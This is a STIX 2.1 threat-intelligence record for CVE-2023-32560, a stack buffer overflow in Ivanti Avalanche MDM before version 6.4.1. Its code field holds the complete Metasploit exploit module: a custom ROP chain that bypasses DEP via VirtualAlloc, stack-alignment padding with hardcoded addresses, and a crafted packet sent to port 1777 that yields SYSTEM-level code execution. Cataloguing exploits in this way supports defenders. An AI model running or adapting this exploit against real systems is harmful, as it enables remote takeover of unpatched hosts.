{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--adaafa8f-2088-4f79-9f0c-687ecbd75545",
    "created": "2024-08-14T16:45:44.744963Z",
    "modified": "2024-08-14T16:45:44.744967Z",
    "name": "Ivanti Avalanche MDM Buffer Overflow",
    "description": " This module exploits a buffer overflow condition in Ivanti Avalanche MDM versions before v6.4.1. An attacker can send a specially crafted message to the Wavelink Avalanche Manager which could result in arbitrary code execution with the NT/AUTHORITY SYSTEM permissions. This vulnerability occurs during the processing of 3/5/8/100/101/102 item data types. The program tries to copy the item data using `qmemcopy` to a fixed size data buffer on stack. Upon successful exploitation the attacker gains full access to the target system.  This vulnerability has been tested against Ivanti Avalanche MDM v6.4.0.0 on Windows 10.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/ivanti_avalanche_mdm_bof.rb",
            "external_id": "ivanti_avalanche_mdm_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-32560"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/security/research/tra-2023-27"
        },
        {
            "source_name": "reference",
            "url": "https://forums.ivanti.com/s/article/Avalanche-Vulnerabilities-Addressed-in-6-4-1"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Ivanti Avalanche MDM Buffer Overflow',\n        'Description' => %q{\n          This module exploits a buffer overflow condition in Ivanti Avalanche MDM versions before v6.4.1.\n          An attacker can send a specially crafted message to the Wavelink Avalanche Manager,\n          which could result in arbitrary code execution with the NT/AUTHORITY SYSTEM permissions.\n          This vulnerability occurs during the processing of 3/5/8/100/101/102 item data types.\n          The program tries to copy the item data using `qmemcopy` to a fixed size data buffer on stack.\n          Upon successful exploitation the attacker gains full access to the target system.\n\n          This vulnerability has been tested against Ivanti Avalanche MDM v6.4.0.0 on Windows 10.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Ege BALCI egebalci[at]pm.me', # PoC & Msf Module\n          'A researcher at Tenable' # Discovery\n        ],\n        'References' => [\n          ['CVE', '2023-32560'],\n          ['URL', 'https://www.tenable.com/security/research/tra-2023-27'],\n          ['URL', 'https://forums.ivanti.com/s/article/Avalanche-Vulnerabilities-Addressed-in-6-4-1']\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Platform' => 'win',\n        'Arch' => ARCH_X86,\n        'Payload' => {\n          'BadChars' => \"\\x3b\"\n        },\n        'Targets' => [['Ivanti Avalanche <= v6.4.0.0', {}]],\n        'Privileged' => true,\n        'DisclosureDate' => '2023-08-14',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The remote Avalanche Manager port', 1777])\n      ]\n    )\n  end\n\n  def check\n    begin\n      connect\n    rescue StandardError\n      print_error('Could not connect to target!')\n      return Exploit::CheckCode::Safe\n    end\n    res = sock.get_once\n\n    if res =~ /p\\.guid/\n      return Exploit::CheckCode::Appears\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    expected_payload_size = 622\n\n    # This is a custom ROP chain for bypassing DEP via VirtualAlloc\n    rop_chain = [0x00544498].pack('V') # pop edx ; mov eax, 0x00000022 ; ret ;\n    rop_chain += [0x00001000].pack('V')  # flAllocationType\n    rop_chain += [0x00499ac0].pack('V')  # pop eax ; ret ;\n    rop_chain += [0x0056a208].pack('V')  # VirtualAlloc IAT entry\n    rop_chain += [0x00566650].pack('V')  # pop ecx ; ret ;\n    rop_chain += [0x00000040].pack('V')  # flProtect\n    rop_chain += [0x0054b079].pack('V')  # pop ebx ; ret ;\n    rop_chain += [0x00000320].pack('V')  # dwSize\n    rop_chain += [0x00402323].pack('V')  # pop ebp; ret\n    rop_chain += [0x0055642a].pack('V')  # pop eax; ret\n    rop_chain += [0x0052ad90].pack('V')  # pop esi; ret;\n    rop_chain += [0x0042792f].pack('V')  # jmp [eax]\n    rop_chain += [0x00521907].pack('V')  # pop edi ; ret ;\n    rop_chain += [0x00568968].pack('V')  # ret ;\n    rop_chain += [0x004995ab].pack('V')  # pushad ; ret ;\n    rop_chain += [0x00499c20].pack('V')  # push esp ; ret\n\n    # Because of the compiler optimized `qmemcpy`\n    # we are not able to directly return to out smashed stack.\n    # This buffer re-arranges the entire stack for escaping\n    # the longass function without crashing.\n    buf = Rex::Text.rand_text_alpha(136)\n    buf += [0].pack('V')             # set empty register\n    buf += [0].pack('V')             # set empty register\n    buf += [0].pack('V')             # stack alignment buffer\n    buf += [0].pack('V')             # stack alignment buffer\n    buf += [0x00511a80].pack('V')    # ESP -> $(rop: \"add esp, 0x10 ; ret ;\")\n    buf += [0x00583900].pack('V')    # .data section scratch space\n    buf += [0x00583900].pack('V')    # .data section scratch space\n    buf += [0x00585858].pack('V')    # .data section scratch space\n    buf += [0x00585857].pack('V')    # .data section scratch space\n\n    # ==================\n    name1 = 'h.mid'\n    value1 = \"\\x30\"\n\n    name2 = 'h.cmd'\n    value2 = \"\\x31\\x39\"\n\n    name3 = 'p.waitprofile'\n    value3 = (buf + rop_chain + make_nops(expected_payload_size - payload.encoded.length) + payload.encoded)\n\n    item1 = [2].pack('N')\n    item1 += [name1.length].pack('N')\n    item1 += [value1.length].pack('N')\n    item1 += name1 + value1\n\n    item2 = [2].pack('N')\n    item2 += [name2.length].pack('N')\n    item2 += [value2.length].pack('N')\n    item2 += name2 + value2\n\n    item3 = [101].pack('N')\n    item3 += [name3.length].pack('N')\n    item3 += [value3.length].pack('N')\n    item3 += name3 + value3\n\n    hp = item1 + item2 + item3\n    if hp.length % 16 != 0 # Add padding if not power of 16\n      hp += (\"\\x00\" * (16 - (hp.length % 16)))\n    end\n\n    preamble = [hp.length + 16].pack('N')\n    preamble += [item1.length + item2.length].pack('N')\n    preamble += [(hp.length + 16) - 0x3b].pack('N')\n    preamble += [0].pack('N')\n\n    packet = preamble + hp\n\n    print_status('Connecting to target...')\n    connect\n    res = sock.get_once\n    fail_with(Failure::UnexpectedReply, 'Could not connect to MDM service - no response') if res.nil?\n\n    print_status('Sending payload...')\n    sock.put(packet)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-08-14",
    "x_mitre_platforms": [
        "win'"
    ]
}